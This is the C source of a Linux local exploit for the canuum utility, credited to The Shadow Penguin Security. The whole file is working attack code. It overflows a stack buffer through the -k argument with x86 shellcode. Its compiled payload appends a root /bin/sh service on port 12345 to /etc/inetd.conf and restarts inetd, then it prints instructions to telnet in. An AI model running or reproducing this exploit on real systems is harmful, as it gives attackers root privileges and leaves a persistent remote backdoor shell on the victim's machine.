/*=============================================================================
   canuum Exploit for Linux 
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/
#include    <stdio.h>

#define RETADR   1676
#define MAXBUF   2000
#define JMP_OFS  0x200
#define NOP      0x90
#define SHELL    "/tmp/pp"
#define COMPILER "gcc"


char exec[60]= 
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff";
FILE *fp;

unsigned long get_sp(void)
{
    __asm__("movl %esp, %eax");
}

main()
{
    char            buf[MAXBUF+1];
    unsigned int    i,ip,sp;

    sprintf(buf,"%s.c",SHELL);
    if ((fp=fopen(buf,"w"))==NULL){
        printf("Can not write to %s\n",buf);
        exit(1);
    }
    fprintf(fp,"main(){setuid(0);setgid(0);");
    fprintf(fp,"system(\"echo 12345 stream tcp nowait root /bin/sh sh -i");
    fprintf(fp," >> /etc/inetd.conf; killall -HUP inetd\");}\n");
    fclose(fp);
    sprintf(buf,"%s %s.c -o %s",COMPILER,SHELL,SHELL);
    system(buf);

    memset(buf,'a',MAXBUF);
    buf[MAXBUF]=0;

    strcat(exec,SHELL);
    memcpy(buf+300,exec,strlen(exec));
    sp=get_sp();
    ip=sp+JMP_OFS;
    printf("Jumping address = %x\n\n\n",ip);
    printf("Please execute following command after \"Segmentation Fault\"\n");
    printf("\ntelnet localhost 12345\n\n\n");
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;
    execl("/usr/jp/canna/bin/canuum","canuum","-k",buf,(char *)0);
}
